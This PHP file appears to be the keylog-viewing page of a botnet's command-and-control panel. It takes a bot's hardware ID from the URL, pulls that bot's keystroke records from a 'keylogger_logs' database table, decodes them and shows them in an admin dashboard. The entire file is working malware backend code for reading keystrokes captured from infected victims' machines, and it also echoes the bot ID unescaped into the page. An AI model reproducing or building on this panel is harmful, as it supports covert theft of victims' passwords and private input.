<?php
include_once("config.php");

function ShowKeylog($hwid){
	
	
	$bot_table = "SELECT * FROM `keylogger_logs` WHERE `hwid` = :hwid";
	$db = connection();
	if($sth = $db->prepare($bot_table)){
		$sth->bindParam(":hwid", $hwid);
		$sth->execute();
		if($sth->rowCount() > 0){
			$row = $sth->fetch();
		
			return "<tr><td>".$row["hwid"]."</td><td> <textarea class=\"form-control\" rows=\"4\">".hex2bin($row["keylog_data"])."</textarea></td><td>".$row["keylog_last_date"]."</td></tr>";
		}
	}
}
if(!empty($_GET["bot_id"])){
$hwid = $_GET["bot_id"];
?>

<!DOCTYPE html>
<html lang="en">
<?php
include_once("header.php");
?>
<body class="sidebar-dark">
  <div class="container-scroller">
    <!-- partial:partials/_navbar.html -->
    <nav class="navbar col-lg-12 col-12 p-0 fixed-top d-flex flex-row">
      <div class="text-center navbar-brand-wrapper d-flex align-items-center justify-content-center">
      </div>
      <div class="navbar-menu-wrapper d-flex align-items-center justify-content-end">
   
        <ul class="navbar-nav navbar-nav-right">
        
          <li class="nav-item nav-profile dropdown">
            <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" id="profileDropdown">
              Options
            </a>
            <div class="dropdown-menu dropdown-menu-right navbar-dropdown" aria-labelledby="profileDropdown">
             
              <a class="dropdown-item">
                <i class="ti-power-off text-primary"></i>
                Logout
              </a>
            </div>
          </li>
        
        </ul>
        <button class="navbar-toggler navbar-toggler-right d-lg-none align-self-center" type="button" data-toggle="offcanvas">
          <span class="ti-layout-grid2"></span>
        </button>
      </div>
    </nav>
    <!-- partial -->
    <div class="container-fluid page-body-wrapper">
      <!-- partial:partials/_settings-panel.html -->
   
      <!-- partial -->
      <!-- partial:partials/_sidebar.html -->
   <?php
   
   include_once("sidebar.php");
   
   ?>
      <!-- partial -->
      <div class="main-panel">
        <div class="content-wrapper">
      
		  <div class="row">
		  
            <div class="col-lg-12 grid-margin stretch-card">
              <div class="card">
                <div class="card-body">
                  <h4 class="card-title">Keylogs for Bot: <?php echo $hwid ?></h4>
				
                  <div class="table-responsive pt-3">
				  
                    <table class="table table-bordered">
                      <thead>
                        <tr>
                          <th>
                            Bot ID
                          </th>
                          <th>
                            Keylog Data
                          </th>
                          <th>
						   Keylog Update Date
                          </th>
                        </tr>
                      </thead>
                      <tbody>
                       <?php
						echo ShowKeylog($hwid);
					   
					   ?>
                      </tbody>
                    </table>
                  </div>
				   
                </div>
              </div>
            </div>
		  
		  </div>
        
		  </div>
          </div>
        </div>
        <!-- content-wrapper ends -->
        <!-- partial:partials/_footer.html -->
   
        <!-- partial -->
      </div>
      <!-- main-panel ends -->
    </div>
    <!-- page-body-wrapper ends -->
  </div>
  <!-- container-scroller -->

  <!-- plugins:js -->
  <script src="vendors/js/vendor.bundle.base.js"></script>
  <!-- endinject -->
  <!-- Plugin js for this page -->
  <script src="vendors/chart.js/Chart.min.js"></script>
  <!-- End plugin js for this page -->
  <!-- inject:js -->
  <script src="js/off-canvas.js"></script>
  <script src="js/hoverable-collapse.js"></script>
  <script src="js/template.js"></script>
  <script src="js/settings.js"></script>
  <script src="js/todolist.js"></script>
  <!-- endinject -->
  <!-- Custom js for this page-->
  <script src="js/dashboard.js"></script>
  <!-- End custom js for this page-->
</body>

</html>

<?php
}
?>